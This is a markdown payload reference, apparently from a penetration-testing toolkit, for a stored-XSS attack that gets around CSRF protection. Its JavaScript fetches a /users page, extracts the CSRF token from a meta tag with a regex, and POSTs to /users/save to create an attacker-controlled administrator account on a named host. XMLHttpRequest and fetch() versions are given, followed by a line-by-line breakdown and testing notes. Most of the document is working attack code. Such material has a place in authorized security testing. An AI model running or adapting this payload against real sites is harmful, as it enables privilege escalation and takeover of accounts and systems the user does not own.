# Example: CSRF Meta Tag + Admin User Creation

**Scenario:** Create a new admin user via XSS when CSRF token is in a meta tag on a different page.

## Scenario Details

| Attribute | Value |
|-----------|-------|
| **Token Location** | Meta tag `<meta name="csrf-token">` on `/users` page |
| **Target Action** | POST to `/users/save` to create admin user |
| **Content-Type** | `application/x-www-form-urlencoded` |
| **Framework** | Custom (meta tag pattern similar to Rails) |
| **Constraint** | Token not on current page - must fetch another page first |

## Key Techniques

1. **Two-stage request**: First fetch a page containing the CSRF token, then use it
2. **Regex token extraction**: Parse token from HTML response text
3. **URL-encoded payload**: Form data with special characters encoded

## Payload

```javascript
(function() {
  var xhr1 = new XMLHttpRequest();
  xhr1.open('GET', 'https://demo-pmap.ateb.com/users?order=a_loginname&loc=-1&size=5', true);

  xhr1.onreadystatechange = function() {
    if (xhr1.readyState === 4 && xhr1.status === 200) {
      var responseText = xhr1.responseText;

      var csrfToken = null;
      var tokenMatch = responseText.match(/<meta\s+name=['"]csrf-token['"]\s+content=['"]([^'"]+)['"]/i);

      if (tokenMatch && tokenMatch[1]) {
        csrfToken = tokenMatch[1];

        var xhr2 = new XMLHttpRequest();
        xhr2.open('POST', 'https://demo-pmap.ateb.com/users/save', true);
        xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
        xhr2.setRequestHeader('X-Csrf-Token', csrfToken);
        xhr2.setRequestHeader('X-Requested-With', 'XMLHttpRequest');

        var payload = '%40clientId=-20000' +
                     '&%40userName=new_attacker_user@praetorianlabs.email' +
                     '&email=' +
                     '&sid=' +
                     '&fullName=' +
                     '&telephone1=' +
                     '&telephone2=' +
                     '&roleSet%5B%5D=obcClientAdmin';

        xhr2.send(payload);
      }
    }
  };

  xhr1.send();
})();
```

## Code Breakdown

### Stage 1: Fetch Page with Token

```javascript
var xhr1 = new XMLHttpRequest();
xhr1.open('GET', 'https://demo-pmap.ateb.com/users?order=a_loginname&loc=-1&size=5', true);
```

- Fetches the users list page which contains the CSRF meta tag
- Query params ensure a valid page response

### Stage 2: Extract Token via Regex

```javascript
var tokenMatch = responseText.match(/<meta\s+name=['"]csrf-token['"]\s+content=['"]([^'"]+)['"]/i);
if (tokenMatch && tokenMatch[1]) {
  csrfToken = tokenMatch[1];
}
```

- Regex handles both single and double quotes
- Case-insensitive matching (`/i` flag)
- Captures token value in group 1

### Stage 3: Execute Authenticated Action

```javascript
xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
xhr2.setRequestHeader('X-Csrf-Token', csrfToken);
xhr2.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
```

- `X-Csrf-Token` header carries the extracted token
- `X-Requested-With: XMLHttpRequest` mimics AJAX request (some frameworks require this)

### Payload Structure

```javascript
var payload = '%40clientId=-20000' +           // @clientId=-20000 (URL-encoded @)
             '&%40userName=new_attacker_user@praetorianlabs.email' +  // @userName
             '&email=' +
             '&sid=' +
             '&fullName=' +
             '&telephone1=' +
             '&telephone2=' +
             '&roleSet%5B%5D=obcClientAdmin';  // roleSet[] = obcClientAdmin (admin role)
```

- `%40` = `@` (URL-encoded)
- `%5B%5D` = `[]` (URL-encoded array notation)
- `obcClientAdmin` = admin role identifier

## Modern fetch() Equivalent

```javascript
(async function() {
  // Stage 1: Fetch page with token
  const response = await fetch('/users?order=a_loginname&loc=-1&size=5', {
    credentials: 'include'
  });
  const html = await response.text();

  // Stage 2: Extract token
  const tokenMatch = html.match(/<meta\s+name=['"]csrf-token['"]\s+content=['"]([^'"]+)['"]/i);
  if (!tokenMatch) return;
  const csrfToken = tokenMatch[1];

  // Stage 3: Create admin user
  const payload = new URLSearchParams({
    '@clientId': '-20000',
    '@userName': 'new_attacker_user@praetorianlabs.email',
    'email': '',
    'sid': '',
    'fullName': '',
    'telephone1': '',
    'telephone2': '',
    'roleSet[]': 'obcClientAdmin'
  });

  await fetch('/users/save', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'X-Csrf-Token': csrfToken,
      'X-Requested-With': 'XMLHttpRequest'
    },
    credentials: 'include',
    body: payload
  });
})();
```

## Why This Pattern

- **Token on different page**: Current XSS injection point doesn't have the token visible
- **XMLHttpRequest used**: Original engagement may have required XHR for compatibility
- **URL-encoded body**: Backend expects form data, not JSON
- **Admin role creation**: `roleSet[]=obcClientAdmin` grants administrative privileges

## Testing Notes

1. Verify `/users` page contains `<meta name="csrf-token">` tag
2. Confirm `X-Csrf-Token` is the expected header name (not `X-CSRFToken`)
3. Check if `X-Requested-With` header is required by the backend
4. Validate admin role identifier (`obcClientAdmin`) is correct
